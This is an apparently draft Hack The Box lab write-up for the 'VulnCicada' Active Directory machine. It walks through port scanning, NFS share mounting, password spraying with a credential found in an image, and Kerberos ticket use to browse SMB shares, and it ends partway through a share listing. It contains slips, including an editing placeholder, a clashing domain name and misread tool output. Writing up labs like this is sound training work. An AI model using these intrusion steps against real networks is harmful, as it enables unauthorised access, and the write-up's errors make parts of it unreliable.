---
title: VulnCicada
date: 2026-04-03
ShowToc: true
draft: true
TocOpen: true
tags:
  - blog
  - HTB
  - medium
  - windows
  - DNS-Netexec-Generate-host
  - nfs-to-rce
  - subdomain-enumeration
lastmod: 2026-04-06T04:04:16.072Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/VulnCicada" >}}

***

# Recon

### PORT & IP SCAN

The `nmap` reveal that the machine is ((change it) a standard Windows AD Server , with the kerberos auth , also the ldap query , and the 3389 port show that the domain `AWSJPDC0522.shibuya.vl` ,but the ldap anonymous inquiry failed .)

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.234.48   -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-04 13:52 +0800
Nmap scan report for 10.129.234.48
Host is up (0.098s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-04 05:52:08Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-04-04T05:27:00
|_Not valid after:  2027-04-04T05:27:00
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-04-04T05:27:00
|_Not valid after:  2027-04-04T05:27:00
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-04-04T05:27:00
|_Not valid after:  2027-04-04T05:27:00
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-04-04T05:27:00
|_Not valid after:  2027-04-04T05:27:00
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2026-04-03T05:34:41
|_Not valid after:  2026-10-03T05:34:41
|_ssl-date: 2026-04-04T05:53:38+00:00; 0s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
50147/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50148/tcp open  msrpc         Microsoft Windows RPC
50166/tcp open  msrpc         Microsoft Windows RPC
50230/tcp open  msrpc         Microsoft Windows RPC
57936/tcp open  msrpc         Microsoft Windows RPC
58175/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-04T05:53:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.26 seconds
```

The start of nmap show the standard Active Directory setting , with nfs , web , rdp ,ldap server

### DNS

{{< toggle "Tag 🏷️" >}}

{{< tag "DNS-Netexec-Generate-host" >}} Discovering the DNS 53 port , using the netexec nxc 's --generate-hosts-file to generate the hosts file and put into the /etc/hosts

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ nxc smb 10.129.234.48  --generate-hosts-file  hosts
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
```

The nxc generates the host file contains the domain name that add into the /etc/hosts

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cat /etc/hosts                                
127.0.0.1       localhost
127.0.1.1       kali-linux-2025-2.localdomain   kali-linux-2025-2
10.129.234.48     DC-JPQ225.cicada.vl cicada.vl DC-JPQ225

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

{{< toggle "Tag 🏷️" >}}

{{< tag "subdomain-enumeration " >}} Failed to enuming subdomain by ffuf\
{{< /toggle >}}

Do the subdomain enumeration

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ ffuf -w /home/parallels/Desktop/subdomains-top1million-20000.txt:FUZZ -u http://FUZZ.cicada.vl -H 'Host: FUZZ.cicada.vl' -ac 


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.cicada.vl
 :: Wordlist         : FUZZ: /home/parallels/Desktop/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.cicada.vl
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [20000/20000] :: Job [1/1] :: 26 req/sec :: Duration: [0:03:57] :: Errors: 20000 ::
```

Nothing

### NFS

{{< toggle "Tag 🏷️" >}}

{{< tag "nfs-to-rce" >}} Enuming the port 2049 NFS , failed to root escape , but discovered /profiles which contained the marketing.png 's password , basic on NFS  /profiles showed users to create the username list to do the burte-force by netexec with -k kerber auth , enuming CertEnroll and profiles\$ is not standard share in SMB share after login . In view of having the shell in smb ,  we can create the kerberoasting ticket (tgt) with  getTGT.py  to login the smb shell with  smbclient.py. Noted there are a lot of crt , so using the certipy,certipy-ad of ADCS to scan for the ESC8 , using the bloodyAD to inject the fake DNS record and sett up the server to listen it , using the PetitPotam to get the pfx which is enabled to use in secretsdump.py  to have the hash to login by wmiexec.py

{{< /toggle >}}

{{< mindmap >}}

# NFS

* profiles
  * password
  * usernames

# smb burte-force

* CertEnroll

# smb shell of kerberoasting

* getTGT.py
  * smbclient.py

## CertEnroll

* ESC8
  * DNS
    * bloodyAD
  * poison
    * PetitPotam
  * pfx
    * secretsdump.py
      * wmiexec.py

{{< /mindmap >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ nxc nfs 10.129.234.48   --shares
NFS         10.129.234.48   2049   10.129.234.48    [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.129.234.48   2049   10.129.234.48    [*] Enumerating NFS Shares
NFS         10.129.234.48   2049   10.129.234.48    UID        Perms    Storage Usage    Share                          Access List    
NFS         10.129.234.48   2049   10.129.234.48    ---        -----    -------------    -----                          -----------    
NFS         10.129.234.48   2049   10.129.234.48    4294967294 rw-      12.1GB/15.4GB    /profiles                      Everyone  
```

Discovering the root escape:False is allow , so will try the inspect the /etc/passwd and /etc/shadow

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ nxc nfs 10.129.234.48    --enum-shares --ls '/' 
NFS         10.129.234.48   2049   10.129.234.48    [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.129.234.48   2049   10.129.234.48    [*] Enumerating NFS Shares Directories
NFS         10.129.234.48   2049   10.129.234.48    [+] /profiles
NFS         10.129.234.48   2049   10.129.234.48    UID        Perms    File Size      File Path                                     Access List    
NFS         10.129.234.48   2049   10.129.234.48    ---        -----    ---------      ---------                                     -----------    
NFS         10.129.234.48   2049   10.129.234.48    4294967294 ---      402.0B         /profiles/Administrator/Documents/desktop.ini Everyone       
NFS         10.129.234.48   2049   10.129.234.48    4294967294 rwx      1.4MB          /profiles/Administrator/vacation.png          Everyone       
NFS         10.129.234.48   2049   10.129.234.48    4294967294 rw-      -              /profiles/Rosie.Powell/Documents/$RECYCLE.BIN/ Everyone       
NFS         10.129.234.48   2049   10.129.234.48    4294967294 rwx      402.0B         /profiles/Rosie.Powell/Documents/desktop.ini  Everyone       
NFS         10.129.234.48   2049   10.129.234.48    4294967294 rwx      1.7MB          /profiles/Rosie.Powell/marketing.png          Everyone       
NFS         10.129.234.48   2049   10.129.234.48    [-] No root escape possible, please specify a share
```

No work to root escape

now let to mount it

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo mkdir /mnt/profiles
[sudo] password for parallels: 
```

Create the Folder

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo mount -t nfs 10.129.234.48:/profiles     /mnt/profiles
mount: (hint) your fstab has been modified, but systemd still uses
       the old version; use 'systemctl daemon-reload' to reload.
```

It failed

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ systemctl daemon-reload

```

Now is ok

{{< tree >}}\
➜  /mnt/profiles\
.\
├── Administrator\
│   ├── Documents  \[error opening dir]\
│   └── vacation.png\
├── Daniel.Marshall\
├── Debra.Wright\
├── Jane.Carter\
├── Jordan.Francis\
├── Joyce.Andrews\
├── Katie.Ward\
├── Megan.Simpson\
├── Richard.Gibbons\
├── Rosie.Powell\
│   ├── Documents  \[error opening dir]\
│   └── marketing.png\
└── Shirley.West

{{< /tree >}}

`vacation.png`\
![Pasted image 20260404144453.png](/ob/Pasted%20image%2020260404144453.png)

\`\`\
`marketing.png`\
![Pasted image 20260404144708.png](/ob/Pasted%20image%2020260404144708.png)

# Shell as Rosie.Powell

### Burte-force

We get the password cicada123 ,and the users list form the nfs shares

{{< code >}}\
Administrator\
Daniel.Marshall\
Debra.Wright\
Jane.Carter\
Jordan.Francis\
Joyce.Andrews\
Katie.Ward\
Megan.Simpson\
Richard.Gibbons\
Rosie.Powell\
Shirley.West\
{{< /code >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ netexec smb cicada.vl   -u ./userlist  -p Cicada123
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Administrator:Cicada123 STATUS_NOT_SUPPORTED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Daniel.Marshall:Cicada123 STATUS_NOT_SUPPORTED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Debra.Wright:Cicada123 STATUS_NOT_SUPPORTED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Jane.Carter:Cicada123 STATUS_NOT_SUPPORTED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Jordan.Francis:Cicada123 STATUS_NOT_SUPPORTED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Joyce.Andrews:Cicada123 STATUS_NOT_SUPPORTED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Katie.Ward:Cicada123 STATUS_NOT_SUPPORTED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Megan.Simpson:Cicada123 STATUS_NOT_SUPPORTED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Richard.Gibbons:Cicada123 STATUS_NOT_SUPPORTED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Rosie.Powell:Cicada123 STATUS_NOT_SUPPORTED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Shirley.West:Cicada123 STATUS_NOT_SUPPORTED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\:Cicada123 STATUS_NOT_SUPPORTED 
```

There are different domain , so need to try another

```shell
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ netexec smb DC-JPQ225.cicada.vl  -u ./userlist  -p Cicada123 -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Administrator:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Daniel.Marshall:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Debra.Wright:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Jane.Carter:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Jordan.Francis:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Joyce.Andrews:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Katie.Ward:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Megan.Simpson:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Richard.Gibbons:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
```

`cicada.vl\Rosie.Powell:Cicada123 ` is work , and so lucky for not needing to do the password deformation !

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell   -p Cicada123 -k --shares                        
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Share           Permissions     Remark
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -----           -----------     ------
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        ADMIN$                          Remote Admin
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        C$                              Default share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        IPC$            READ            Remote IPC
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ            Logon server share 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE      
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share 
```

| **Share**        | **Status**       | **Typical Presence**                          |
| ---------------- | ---------------- | --------------------------------------------- |
| **`ADMIN$`**     | Standard         | Every Windows machine                         |
| **`C$`**         | Standard         | Every Windows machine                         |
| **`IPC$`**       | Standard         | Every Windows machine                         |
| **`NETLOGON`**   | Standard         | Every Domain Controller                       |
| **`SYSVOL`**     | Standard         | Every Domain Controller                       |
| **`CertEnroll`** | **Non-Standard** | Only on Certificate Authority (AD CS) servers |
| **`profiles$`**  | **Non-Standard** | Created by Admin (Roaming Profiles)           |

### SMB Not normal share

The share more CertEnroll , profiles$  , and the profiles$ is enable to write

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell   -p Cicada123 -k --shares --spider 'profiles$' --regex .
 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Share           Permissions     Remark
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -----           -----------     ------
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        ADMIN$                          Remote Admin
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        C$                              Default share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        IPC$            READ            Remote IPC
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ            Logon server share 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE      
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Spidering .
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/.. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Administrator [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Daniel.Marshall [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Debra.Wright [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Jane.Carter [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Jordan.Francis [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Joyce.Andrews [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Katie.Ward [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Megan.Simpson [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Richard.Gibbons [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Rosie.Powell [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Shirley.West [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Administrator/. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Administrator/.. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Administrator/Documents [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Administrator/vacation.png [lastm:'2024-09-15 21:25' size:1490573]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Daniel.Marshall/. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Daniel.Marshall/.. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Debra.Wright/. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Debra.Wright/.. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Jane.Carter/. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Jane.Carter/.. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Jordan.Francis/. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Jordan.Francis/.. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Joyce.Andrews/. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Joyce.Andrews/.. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Katie.Ward/. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Katie.Ward/.. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Megan.Simpson/. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Megan.Simpson/.. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Richard.Gibbons/. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Richard.Gibbons/.. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Rosie.Powell/. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Rosie.Powell/.. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Rosie.Powell/Documents [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Rosie.Powell/marketing.png [lastm:'2024-09-15 21:25' size:1832505]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Rosie.Powell/Documents/. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Rosie.Powell/Documents/.. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Rosie.Powell/Documents/$RECYCLE.BIN [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Rosie.Powell/Documents/desktop.ini [lastm:'2024-09-13 23:50' size:402]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Rosie.Powell/Documents/$RECYCLE.BIN/. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Rosie.Powell/Documents/$RECYCLE.BIN/.. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Rosie.Powell/Documents/$RECYCLE.BIN/desktop.ini [lastm:'2024-09-13 23:50' size:129]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Shirley.West/. [dir]
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        //DC-JPQ225.cicada.vl/profiles$/Shirley.West/.. [dir]
                                                                                                                  
```

The user folder dont have the `.ssh` ,so i cant inject the ssh in

Using a standard password with SMB tools, the tool often defaults to **NTLM authentication**. If a network has "Restricted Admin" mode enabled, or if SMB signing is strictly enforced and NTLM is disabled via Group Policy, your direct login attempt will fail even with the right credentials.

By using `getTGT.py`, you are telling the Domain Controller (DC): *"I have the password; please give me a Kerberos ticket."* Once you have that ticket (a `.ccache` file), you can authenticate via Kerberos, which often bypasses NTLM-specific blocks.

### getTGT.py

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ locate getTGT.py  
/usr/lib/python3/dist-packages/minikerberos/examples/getTGT.py
/usr/share/doc/python3-impacket/examples/getTGT.py
                                                                                                                    
                                                                                                                                                                       
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ sudo ntpdate cicada.vl                                                                 
[sudo] password for parallels: 
2026-04-04 16:46:01.711203 (+0800) +0.051519 +/- 0.019434 DC-JPQ225.cicada.vl 10.129.234.48 s1 no-leap
                                                                                                                                                                              
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ /usr/share/doc/python3-impacket/examples/getTGT.py  'CICADA.VL/Rosie.Powell:Cicada123' -dc-ip 10.129.234.48
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Rosie.Powell.ccache
```

export it to KRB5CCNAME variable

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ export KRB5CCNAME=Rosie.Powell.ccache
                                                                                                                                                                                
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ nxc smb 10.129.234.48  -u Rosie.Powell  -k --use-kcache
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.234.48   445    DC-JPQ225        [+] CICADA.VL\Rosie.Powell from ccache 
                                                                                              
```

### smbclient.py

Connecting with smbclient.py

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ /usr/share/doc/python3-impacket/examples/smbclient.py -k DC-JPQ225.cicada.vl
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
CertEnroll
IPC$
NETLOGON
profiles$
SYSVOL
```

[Here](https://tools.thehacker.recipes/impacket/examples/smbclient.py#mini-shell) has the detailed `smbclient.py` list for command

{{< code >}}\
drw-rw-rw-          0  Sat Apr  4 13:40:52 2026 .\
drw-rw-rw-          0  Fri Sep 13 23:17:59 2024 ..\
-rw-rw-rw-        741  Sat Apr  4 13:35:36 2026 cicada-DC-JPQ225-CA(1)+.crl\
-rw-rw-rw-        941  Sat Apr  4 13:35:36 2026 cicada-DC-JPQ225-CA(1).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(10)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(10).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(11)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(11).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(12)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(12).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(13)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(13).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(14)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(14).crl\
-rw-rw-rw-        742  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(15)+.crl\
-rw-rw-rw-        943  Sat Apr  4 13:35:35 2026 cicada-DC-JPQ225-CA(15).crl\
